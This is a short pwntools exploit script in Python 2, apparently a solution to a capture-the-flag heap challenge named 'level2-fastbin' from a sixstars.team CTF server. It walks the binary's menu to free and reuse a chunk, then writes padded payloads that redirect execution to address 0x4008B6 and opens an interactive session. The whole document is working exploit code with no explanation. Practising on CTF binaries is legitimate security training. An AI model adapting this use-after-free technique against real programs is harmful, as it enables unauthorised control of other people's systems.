from pwn import *

context.log_level="debug"

#r=remote("pwn.sixstars.team",22502)
r=process("./level2-fastbin")

r.recv()

print r.pid
pause()

r.sendline("1")

r.recvuntil(">>")
r.sendline("1")
r.recvuntil(":")
r.sendline("1")
r.recvuntil(":")
r.sendline("1")
r.recvuntil(":")
r.sendline("2")


r.recvuntil(">>")
r.sendline("3")
r.recvuntil(":")
r.sendline("1")

r.recvuntil(">>")
r.sendline("4")
r.recvuntil(":")
sh='a'*8*10+p64(0x4008B6)
sh2=p64(0x33)+p64(0)+p64(0)+p64(0)+p64(0)+p64(0)+p64(0x4008B6)
sh3='7'*8*6+p64(0x4008B6)
r.sendline(sh3)

r.recvuntil(">>")
r.sendline("3")
r.recvuntil(":")
r.sendline("1")


r.interactive()


